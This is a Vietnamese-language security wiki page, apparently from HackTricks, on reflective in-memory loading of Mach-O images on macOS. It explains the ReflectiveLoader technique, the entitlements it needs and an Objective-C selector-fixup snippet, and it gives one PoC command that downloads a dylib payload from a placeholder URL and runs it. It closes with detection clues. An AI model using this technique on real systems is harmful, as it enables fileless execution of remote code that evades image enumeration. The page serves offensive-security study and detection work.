# Reflective Mach-O Loading trên macOS

{{#include ../../../banners/hacktricks-training.md}}

Reflective loader ánh xạ một image Mach-O từ các byte đã có trong process của chính nó, sau đó liên kết image và chạy các initializer mà không yêu cầu system loader mở file payload. Đây là **thực thi code trong process**, không phải primitive leo thang đặc quyền hay injection vào process từ xa.<sup>[[2]](#references)</sup>

Trên các phiên bản macOS gần đây, đường dẫn cũ `NSCreateObjectFileImageFromMemory`/`NSLinkModule` ghi image xuống đĩa. ReflectiveLoader thay vào đó nhúng code loading dyld cũ của Apple; Wardle đã chứng minh cách này hoạt động trên macOS 15 và 26.<sup>[[2]](#references)[[3]](#references)</sup>

Nếu loader dùng Hardened Runtime, code unsigned trong bộ nhớ cần một ngoại lệ cho executable memory, chẳng hạn `com.apple.security.cs.allow-unsigned-executable-memory` hoặc `com.apple.security.cs.disable-executable-page-protection`; nếu không, việc thực thi sẽ bị code-signing enforcement chặn. Đây là ràng buộc về signing của loader, không phải primitive nâng quyền. Xem [tài liệu tham khảo về macOS entitlements](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Để chạy PoC, cung cấp URL phục vụ một **bundle, framework hoặc dylib** Mach-O thô. `main.mm` từ chối các lượt tải xuống rỗng và cho biết payload dùng `LC_DYLD_CHAINED_FIXUPS` không được hỗ trợ. Chấp nhận cả pathname cục bộ, nhưng cách nhập này không phải quy trình không dùng file. Dạng URL đọc các byte vào `NSData` rồi truyền buffer cùng độ dài của nó cho `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Embedded loader gọi `ImageLoaderMachO::instantiateFromMemory`, sau đó là `image->link`. Nó đăng ký metadata Objective-C **sau khi linking nhưng trước** `image->runInitializers`, thao tác này thực thi các constructor.<sup>[[5]](#references)</sup> Nếu không đăng ký, constructor gửi thông điệp Objective-C có thể gặp lỗi `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Xem [luồng tải image thông thường của dyld](macos-library-injection/macos-dyld-process.md#flow) và [tài liệu tham khảo về các section Mach-O](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Kích hoạt metadata Objective-C

Không giống như quá trình tải thông thường của dyld, việc nhúng image loader cũ hơn không tự động khiến metadata Objective-C của payload có thể được `libobjc` sử dụng.<sup>[[3]](#references)</sup> Cách tiếp cận LLVM JIT đã điều chỉnh quét các section Objective-C trong `__DATA` và `__DATA_CONST` đã được ánh xạ, rồi thực hiện các bước sau trước khi chạy constructor:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Duyệt `__objc_selrefs` theo từng bước `sizeof(SEL)`. Lấy tên của mỗi selector khác null bằng `sel_getName`, truyền tên đó cho `sel_registerName`, rồi thay con trỏ trong section bằng `SEL` chuẩn.
2. Thu thập các class từ `__objc_classlist` và đăng ký chúng bằng `objc_readClassPair`, đồng thời phân giải các phụ thuộc superclass trước.
3. Viết lại các tham chiếu trong `__objc_classrefs` và `__objc_superrefs` thành các class hoặc metaclass đã đăng ký, đồng thời gắn các phương thức category từ `__objc_catlist`.

Ví dụ, phần sửa selector trong `ObjCRuntime.cpp` tương đương với:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

PoC dựa vào hành vi nội bộ của Objective-C runtime và không hỗ trợ mọi tính năng của định dạng Mach-O, vì vậy mã đăng ký chỉ là tài liệu tham khảo về cách triển khai chứ không phải loader dùng chung có thể thay thế trực tiếp.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Cần đăng ký cả các class và method của Apple được tham chiếu lẫn các class do payload định nghĩa.<sup>[[3]](#references)</sup>

Trong các thử nghiệm của tác giả, image được nạp reflective không xuất hiện trong `dyld_all_image_infos`. Thay vào đó, các vùng nhớ thực thi vô danh có thể xuất hiện dưới dạng vùng `dylib` không tên trong `vmmap`; các frame được lấy mẫu có thể hiển thị là `<unknown binary>`. Đây là những manh mối để kiểm tra, không phải căn cứ đáng tin cậy để quy kết cho loader này; quyền truy cập thông tin task của một tiến trình khác bị giới hạn bởi entitlement. Xem [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) để biết các giới hạn khi truy cập tiến trình.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C và Swift trên macOS: tổng hợp kiến thức](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Khôi phục Reflective Code Loading trên macOS (Phần I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Khôi phục Reflective Code Loading trên macOS (Phần II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
